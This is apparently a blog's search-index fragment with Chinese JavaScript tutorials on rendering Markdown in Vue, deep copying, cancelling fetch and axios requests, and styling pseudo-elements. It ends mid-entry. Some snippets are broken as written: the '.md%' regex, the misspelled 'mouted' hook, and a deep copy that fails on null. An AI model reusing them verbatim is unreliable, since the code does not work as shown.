  configureWebpack<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    module<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      rules<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
          test<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.md%</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">,</span>
          use<span class="token operator">:</span> <span class="token string">"raw-loader"</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>配置完成后，就可以在项目中引入后缀为md的文件了</p>
<h3 id="2-将-md文件载入页面"><a href="#2-将-md文件载入页面" class="headerlink" title="2.将.md文件载入页面"></a>2.将.md文件载入页面</h3><p>由于公司项目基本都在使用iview的UI框架，iview对浏览器默认样式进行了重置，所以需要重新设定诸如h1、h2、表格等css样式，这里我将重设的样式写在<a href="../files/md.less">md.less</a>中；使用highlight.js时也需要引入选择的主题样式，这里我使用了github风格的代码样式。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- 使用v-html绑定解析出的html代码，将所有为markdown重写的css样式放在md-container类下，不污染全局样式 --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>md-container<span class="token punctuation">"</span></span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mdHTML<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>article</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token comment">// 载入md文件</span>
<span class="token keyword">import</span> md <span class="token keyword">from</span> <span class="token string">"@/../README.md"</span><span class="token punctuation">;</span>
<span class="token comment">// 引入marked.js</span>
<span class="token keyword">import</span> marked <span class="token keyword">from</span> <span class="token string">"marked"</span><span class="token punctuation">;</span>
<span class="token comment">// 引入highlight.js</span>
<span class="token keyword">import</span> hljs <span class="token keyword">from</span> <span class="token string">"highlight.js"</span><span class="token punctuation">;</span>
<span class="token comment">// 引入github代码样式</span>
<span class="token keyword">import</span> <span class="token string">"highlight.js/styles/github.css"</span><span class="token punctuation">;</span>
<span class="token comment">// 引入重写的h1、h2、table等css样式</span>
<span class="token keyword">import</span> <span class="token string">"./md.less"</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">&#123;</span>
  name<span class="token operator">:</span> <span class="token string">"md-example"</span><span class="token punctuation">,</span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
      mdHTML<span class="token operator">:</span> <span class="token keyword">null</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function">mouted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 设置marked</span>
    marked<span class="token punctuation">.</span><span class="token function">setOptions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
      <span class="token comment">// 代码区域高亮</span>
      <span class="token function-variable function">highlight</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre class="hljs">&lt;code></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hljs<span class="token punctuation">.</span><span class="token function">highlightAuto</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/code>&lt;/pre></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token comment">// md中的空行识别为分段，默认为false</span>
      breaks<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      <span class="token comment">// github flavored markdown 解析为github风格的markdown，默认为true，可不设置</span>
      gfm<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      <span class="token comment">// 若表格项为true且gfm项也为true，则以github方式解析表格，默认为true，可不设置</span>
      tables<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将解析后的html文本赋值给mdHTML</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>mdHTML <span class="token operator">=</span> <span class="token function">marked</span><span class="token punctuation">(</span>md<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 也可以将设置marked与解析赋值合并为一步</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>mdHTML <span class="token operator">=</span> <span class="token function">marked</span><span class="token punctuation">(</span>md<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token function-variable function">highlight</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;pre class="hljs">&lt;code></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hljs<span class="token punctuation">.</span><span class="token function">highlightAuto</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/code>&lt;/pre></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      breaks<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      gfm<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
      tables<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就可以在页面上加载出md文件了，如果一些样式上还有不满意，可以自行调整<a href="../files/md.less">md.less</a>样式文件以及选择不同的highlight主题。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript对象与数组的深拷贝</title>
    <url>/2019/07/12/javascript%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84%E7%9A%84%E6%B7%B1%E6%8B%B7%E8%B4%9D/</url>
    <content><![CDATA[<h2 id="对象与数组的特点"><a href="#对象与数组的特点" class="headerlink" title="对象与数组的特点"></a>对象与数组的特点</h2><p>对象与数组都是与字符串、数字、布尔等基本类型不同的类型，当我们将一个对象或数组赋值给另一个变量时，我们并没有复制这个对象或数组，而是将原对象或原数组在内存位置中的索引赋值给了这个变量，这就导致我们在修改这个变量时，最初的对象或数组也被改变了。因为我们通过变量中的内存位置索引，找到的就是最初的对象或数组本身。</p>
<h2 id="对象与数组的浅拷贝"><a href="#对象与数组的浅拷贝" class="headerlink" title="对象与数组的浅拷贝"></a>对象与数组的浅拷贝</h2><p>当我们需要复制一个对象或数组，而不是仅仅获得当前对象或数组的索引时，就要用到对象或数组的拷贝。对象的拷贝使用Object.assign方法，Object.assign(target, …sources)，target为目标对象，sources为源对象，源对象可以是一个或多个。数组的拷贝使用Array.from方法，Array.from(arrayLike[, mapFn[, thisArg]])，arrayLike是要转换成数组的伪数组对象或可迭代对象；mapFn可选参数，代表新数组中每个元素会执行的回调函数；thisArg可选参数，执行回调函数mapFn时的this对象。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  b<span class="token operator">:</span> <span class="token number">2</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newFoo <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> newBar <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="对象与数组的深拷贝"><a href="#对象与数组的深拷贝" class="headerlink" title="对象与数组的深拷贝"></a>对象与数组的深拷贝</h2><p>当对象或数组中嵌套了对象或数组时，对象与数组的浅拷贝无法将嵌套的对象或数组拷贝进去，得到的还是原对象或原数组内存位置的索引。这个时候就要对对象或数组进行深拷贝了。深拷贝需要递归对象或数组进行拷贝，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">deepCopyObject</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> newObj<span class="token punctuation">;</span>
  <span class="token comment">// 判断对象是否为数组</span>
  Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>newObj <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>newObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 获取对象可迭代的键值并遍历</span>
  Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 若对象内的值还是一个对象，则递归；否则直接赋值</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepCopyObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>对象</tag>
        <tag>数组</tag>
        <tag>深拷贝</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript如何获取浏览器类型</title>
    <url>/2019/03/08/javascript%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="如何获取浏览器类型"><a href="#如何获取浏览器类型" class="headerlink" title="如何获取浏览器类型"></a>如何获取浏览器类型</h1><p>在javascript中我们经常需要通过浏览器类型的不同使用不同的兼容逻辑，那么如何获取浏览器类型呢？我们可以使用navigator.userAgent，再通过字符串的indexOf方法去判断里面有没有诸如”AppleWebKit”等字符串来判定浏览器类型。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>浏览器类型</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript批量取消请求</title>
    <url>/2021/05/06/javascript%E6%89%B9%E9%87%8F%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>前端框架时代，越来越多的网站成为了单页应用，路由被前端接管，切换到新的路由，只要请求 json 数据就可以了，但随之而来，也产生了一个问题：上一个路由发出的请求还未收到响应，下一个路由又发了新的请求，而旧请求响应在新请求的响应后才到达，就会发生本应该使用新响应数据的视图却最终使用了旧响应的数据，导致内容文不对题的情况发生。</p>
<p>解决这个问题的思路乍一想也很简单，在路由切换时，取消所有尚未返回响应的请求即可，但现实并非如此。</p>
<span id="more"></span>

<h2 id="fetch-取消请求"><a href="#fetch-取消请求" class="headerlink" title="fetch 取消请求"></a>fetch 取消请求</h2><p>fetch 现阶段的稳定标准尚不支持取消请求，试验性提案中有一个 signal 配置属性，配合同样处于试验性提案阶段的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController">AbortController</a> API 可以实现取消请求的效果。(主流浏览器基本均已支持该试验提案)</p>
<p>取消 fetch 调用的示例：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 创建一个 AbortController 实例，该实例具有 signal 属性</span>
<span class="token keyword">const</span> controller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AbortController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> signal <span class="token operator">=</span> controller<span class="token punctuation">.</span>signal<span class="token punctuation">;</span>

<span class="token comment">// 请求与取消请求的按钮及事件</span>
<span class="token keyword">const</span> downloadBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".download"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> abortBtn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".abort"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
downloadBtn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> fetchVideo<span class="token punctuation">)</span><span class="token punctuation">;</span>
abortBtn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 调用 AbortController 实例的 abort 方法来取消所有使用该信号的 fetch 请求</span>
  controller<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Download aborted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">fetchVideo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 将 AbortController 实例的 signal 传递给 fetch options 的 signal 属性</span>
  <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> signal <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">//...</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      reports<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">"Download error: "</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>message<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="axios-取消请求"><a href="#axios-取消请求" class="headerlink" title="axios 取消请求"></a>axios 取消请求</h2><p>axios 取消请求使用了已被撤回的可取消 Promise 提案 <a href="https://github.com/tc39/proposal-cancelable-promises">cancelable promises proposal</a>，初步的使用参考<a href="https://github.com/axios/axios#cancellation">axios 官方文档 Cancellation</a>。</p>
<p>axios 官网文档只涉及到了初步的使用，这里还有两点需要注意：</p>
<ol>
<li>当请求被取消后，就无法再次调用了，需要重置 CancelToken 为新的 CancelToken 实例后才能再次请求；</li>
<li>可以在每个请求中使用不同的 CancelToken 实例，也可以全局使用一个 CancelToken，来批量取消请求；</li>
</ol>
<p>下面是批量取消请求的示例，这里把全局的 CancelToken 实例存储在 window.globalVar 对象下，用于全局访问</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 在请求文件中，拦截所有请求，使用全局的CancelToken实例为请求添加cancelToken属性</span>
<span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">"axios"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> Axios <span class="token operator">=</span> axios<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  baseURL<span class="token operator">:</span> baseUrl<span class="token punctuation">,</span>
  withCredentials<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
  timeout<span class="token operator">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 请求拦截函数</span>
<span class="token keyword">function</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>req<span class="token operator">:</span> AxiosRequestConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 请求时增加全局取消token</span>
  req<span class="token punctuation">.</span>cancelToken <span class="token operator">=</span> window<span class="token punctuation">.</span>globalVar<span class="token punctuation">.</span>cancelTokenSource<span class="token operator">?.</span>token<span class="token punctuation">;</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">handleError</span><span class="token punctuation">(</span>err<span class="token operator">:</span> AxiosError<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token builtin">Promise</span><span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
Axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>handleRequest<span class="token punctuation">,</span> handleError<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 在路由文件中，当路由改变需要批量拦截请求时</span>
<span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">"axios"</span><span class="token punctuation">;</span>
<span class="token comment">// 批量取消所有请求</span>
window<span class="token punctuation">.</span>globalVar<span class="token punctuation">.</span>cancelTokenSource<span class="token operator">?.</span><span class="token function">cancel</span><span class="token punctuation">(</span><span class="token string">"上个请求已取消"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 重置全局CancelToken实例，防止下次发起请求时，请求仍处于被取消状态</span>
window<span class="token punctuation">.</span>globalVar<span class="token punctuation">.</span>cancelTokenSource <span class="token operator">=</span> axios<span class="token punctuation">.</span>CancelToken<span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料</p>
<p><a href="https://github.com/chunpu/blog/issues/98">单页面应用批量取消请求的最佳实践</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>fetch</tag>
        <tag>取消请求</tag>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript如何获取伪元素的css属性</title>
    <url>/2019/03/08/javascript%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E4%BC%AA%E5%85%83%E7%B4%A0%E7%9A%84css%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<h1 id="如何获取伪元素的CSS属性"><a href="#如何获取伪元素的CSS属性" class="headerlink" title="如何获取伪元素的CSS属性"></a>如何获取伪元素的CSS属性</h1><p>伪元素是例如::after，::before等形式的css生成的元素。javascript中没有直接获取伪元素的选择器，但是有获取伪元素属性的方法。</p>
<p>window.getComputedStyle()</p>
<p>我们可以使用window.getComputedStyle()方法获取伪元素，再使用getPropertyValue()方法获取属性值。</p>
<p>语法：window.getComputedStyle(element[, pseudoElement])</p>
<p>element为伪元素所在的元素，pseudoElement为伪元素自身。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 假如我们要获取的是class为test的::after伪元素，并获取到它的content值</span>
<span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> afterStyle <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">getComputedStyle</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> <span class="token string">"::after"</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> afterContent <span class="token operator">=</span> afterStyle<span class="token punctuation">.</span><span class="token function">getPropertyValue</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果想要修改伪元素的属性怎么办呢？可以直接在取到的属性上赋值吗？答案是否定的，因为这里的style是计算出来的（看方法名就知道），所以是只读的，无法修改。我们并没有办法直接修改到伪元素的属性，只能通过获取styleSheet，再使用addRules（兼容IE）和insertRules（现代浏览器）方法来新增覆盖掉原来的伪元素样式。或者利用DOM原素的data-属性来修改。或者通过改变class类来改变伪元素。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 修改styleSheet</span>
document<span class="token punctuation">.</span>styleSheets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">addRule</span><span class="token punctuation">(</span><span class="token string">'.test::after'</span><span class="token punctuation">,</span><span class="token string">'content: hellow'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 支持IE</span>
document<span class="token punctuation">.</span>styleSheets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">insertRule</span><span class="token punctuation">(</span><span class="token string">'.test::after &#123; content: hellow &#125;'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 支持非IE的现代浏览器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- CSS代码 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
<span class="token selector">.test::after</span> <span class="token punctuation">&#123;</span>
  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">attr</span><span class="token punctuation">(</span>data-attr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- HTML代码 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token attr-name">data-attr</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hellow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- JacaScript代码 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
element<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"data-attr"</span><span class="token punctuation">,</span> <span class="token string">"hellow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>伪元素</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript控制流的三个问题</title>
    <url>/2018/02/26/javascript%E6%8E%A7%E5%88%B6%E6%B5%81%E7%9A%84%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="switch-的特性"><a href="#switch-的特性" class="headerlink" title="switch 的特性"></a>switch 的特性</h2><p>switch 语句会从找到的第一个匹配分支起执行语句，如果没有遇到 break, return, continue, throw 等控制语句，会一直执行到 switch 语句的最后，此时，可能已经贯穿执行了其他 case 条件下的语句。这可以做为不同 case 使用相同执行语句的方法，减少代码量。但这也可能会带来问题。所以应小心这种 fall-through execution（贯穿执行）的问题。</p>
<span id="more"></span>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">switch</span> <span class="token punctuation">(</span>abc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
    abc <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
    abc <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span> <span class="token comment">// 如果case3和case4都执行相同代码，则可以利用fall-through execution，写为</span>
    abc <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// case 3:</span>
